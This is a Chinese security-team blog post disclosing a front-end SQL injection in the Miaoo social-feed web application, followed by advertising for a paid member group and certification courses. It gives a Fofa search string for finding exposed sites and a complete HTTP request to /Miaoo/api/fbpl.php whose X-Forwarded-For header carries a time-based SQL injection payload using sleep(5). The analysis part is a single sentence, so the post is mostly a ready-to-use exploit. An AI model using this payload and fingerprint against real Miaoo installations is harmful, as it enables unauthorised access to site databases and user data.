#  Miaoo朋友圈程序存在前台SQL注入漏洞   
 C4安全团队   2025-04-05 20:14  
  
## 0x00 前言  
  
█   
该文章来自零日防线社区用户投稿   
█  
  
**前台一键发布图文，视频，音乐。发布内容支持定位或自定义位置信息。支持将发布内容设为广告模式消息站内通知或邮件通知。支持其他用户注册,支持其他用户发布文章,管理自己的文章。**  
  
****  
**Fofa语句:"./assets/img/thumbnail.svg"**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5fXLvCBTic875uxTJ7NJxq4obeZTFZn5LKyvpJDD2GusA5mCiaZaGg3qwfvuz2X7Dx6eiaxw9kpBkp9A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5fXLvCBTic875uxTJ7NJxq4oSpQLvuEVMqLkDichwp6FBOA8rP3l0bWB9hiczdOh4bE4tPqRxdteusZQ/640?wx_fmt=other&from=appmsg "")  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5fXLvCBTic875uxTJ7NJxq4oEdBYLiaSpRHlI4Wnpc1havjlOfRMBddiaORDBib69FAib53WVa285ibIFOg/640?wx_fmt=other&from=appmsg "")  
## 0x01 漏洞分析&复现  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5fXLvCBTic875uxTJ7NJxq4on1qOhVpsLSIXA5aqRgicpVteGficv9a4KqdwX8M3AhPTdPBdRdnsdddg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5fXLvCBTic875uxTJ7NJxq4oD9gMWHBnHomSrLRTkYwiajH23C8xNajHZoFa6wjJfx1sluQnLBAnp2g/640?wx_fmt=png&from=appmsg "")  
  
位于 fbpl.php 中的ip参数可控，如，并未过滤就直接插入sql语句，造成注入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5fXLvCBTic875uxTJ7NJxq4obFpjamib2NprStZteQAFpgMSKvgrgCzeRgT4aRUic2ZahiaAAwqAL8SnQ/640?wx_fmt=png&from=appmsg "")  
  
需要先注册一个用户-Payload 数据包如下：  
  
```
POST /Miaoo/api/fbpl.php HTTP/1.1Host: 127.0.0.1Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/122.0.0.0 Safari/537.36Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Cookie: dark_theme=root; PHPSESSID=0ht8dht3gd8ooo5g6esuhervne; username=test123;passid=5fwlo384oiz416wz9hioc31dupu7uxsd6ch1kf9me2kd4jzaif3ng9m41fi6yyqaAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Content-Type: application/x-www-form-urlencodedConnection: closeContent-Length: 41X-Forwarded-For: 192.168.1.1','1',sleep(5));#(tieid=1&ztm=1&tiehf=1&tieea=1&pltext=1123
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5fXLvCBTic875uxTJ7NJxq4otBicsyibE4J2HYMFbSXAV5lsLeblhny0ox15Uic5NH7wDkic2hsXT8fhyQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/EXTCGqBpVJSiao22HdM7F7OBu4zNJicKjkysic7NSibpvLZNxicl3gia2AQgicckC6D0UmMgUvPYkMGUrVO11qVoiaN5UQ/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=wxpic "")  
  
内部圈子介绍  
  
  
我们是C4安全团队  
，师傅们别忘了  
关注和  
点赞，团队的成长离不开你们，感谢师傅们，Ciallo～(∠・ω< )⌒★~  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJSiao22HdM7F7OBu4zNJicKjkh1aPOciaQusEdbRfFxibYX9MQUfcsgzH7DaD69vsgW2HgSiceoqqrongQ/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
圈子专注于更新  
SRC挖掘  
/代码审计  
相关：  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/HaJr68L1tTTex7g7gA9hIFRAorxicicgGM4NFxNNVqAaFBL5ictHcaU9zf0zmhChIgNAvRrxUSV1l2FyI6ucawvXg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
**内部圈子**  
**专栏介绍**  
  
Freebuf知识大陆内部共享资料截屏详情如下  
  
（每周保持更新）  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJSiao22HdM7F7OBu4zNJicKjkzvdgfFtJotO7T8dD5ATKyyeuQibDwZoltOB3Uy5nRicGDxCEpwrlRYNg/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
**知识大陆——安全渗透感知大家族**  
****  
  
圈子券后现价 ￥49.9元  
  
如果你有兴趣加入，抓住机会不要犹豫，价格只会上涨，不会下跌  
  
圈子人数少于400人 49.9元/年  
  
圈子人数少于600人 69.9元/年  
  
（新人优惠券10，扫码或者私信开头二维码即可领取）  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSiao22HdM7F7OBu4zNJicKjkmbjBasHPFar7Cyrl5RBiawuiaks0DMFmHXODN0UkbaCnfMqtuLZicJXDw/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
内部圈子——  
群  
友反馈  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJSiao22HdM7F7OBu4zNJicKjkZXuRl4vOBsaQwJK1AbsPcGMiczaPickCuIzicPiblfFjyjic3aeuzqVLLhg/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJSiao22HdM7F7OBu4zNJicKjkpxDWia5shmzQH4UialWGUCsoWYMHVpcEtUxF7RsfJaHKl9gsVWEjqAuw/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
漏洞源码圈子  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJT7soFia2S7F1oP7rh8ZeAwcjib4zibjfzUaQjLqIXcx6277rE9eP9fibRBBnia5neIEwnkEibNW97ia5FOw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
团队公开交流群  
  
QQ群和微信群都已建立，方便常用QQ或微信的师傅加入团队公开交流群，交流各类网安、实战方面的问题~  
  
（微信群①群已满200人，需要邀请加开头运营二维码才能加入，②群如下）  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJQ3tIc6DmyWu5uY5PkcNoDFwqLIlAKRmdNricVPAOaDh7XVmiaLzVA32aRRdtaOA5icDTZLAuG5JmZng/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/EXTCGqBpVJSiao22HdM7F7OBu4zNJicKjkysic7NSibpvLZNxicl3gia2AQgicckC6D0UmMgUvPYkMGUrVO11qVoiaN5UQ/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=wxpic "")  
  
网安考证咨询  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRPB8LAoicALgsdtxmen9tiasaAjJImJDkVXQV86YymyOYWfj3nicwJ11Jp7ySq1HjBazRjibFW7fEbWg/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "httpsu.wechat.comMMNIFu0mUhIchBxkan0Zozgs=1.png")  
  
**扫码联系**  
  
获取考证课程信息  
  
  
  
  
课程合作方：  
北京承制科技有限公司  
  
  
承制科技  
拥有多位资历非常丰富的CISP、NISP讲师，单从授课次数来讲，仅其中三位讲师加起来就有57次培训讲师的授课经历、参加过的项目/赛事支持总计43+次，其中不乏全国性网络安全赛事的冠军，更有讲师担任过国内网络安全赛事的出题人和裁判。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJT7soFia2S7F1oP7rh8ZeAwcZibRxL7Pf4lOcW0ticZXr8ib5EWich5RQ0wopyGIKORvrqmJrIJm16nKEg/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJT7soFia2S7F1oP7rh8ZeAwcUgxFYRSTfPxy8dAhJ1cSEy1RZbCD4HbuIQaHuDmF5I7aIVHTHrPl4w/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJT7soFia2S7F1oP7rh8ZeAwcreFg2WYmaqXMPjLSibaRBm9DYWwe8zhxzSXtWUDM1etEHOTNeRKic2Xg/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJT7soFia2S7F1oP7rh8ZeAwcHPT7QLTzv7EJ9Xb1ibTfGN8n1ibOjnQQVWg0G8JkSkzy5LsNxLrt6BOA/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJT7soFia2S7F1oP7rh8ZeAwcTrNicLLNQoFJl4dUbrAqPYrM42VPKiczZYvQoCmOUtI3Tw8eTGya4s5Q/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
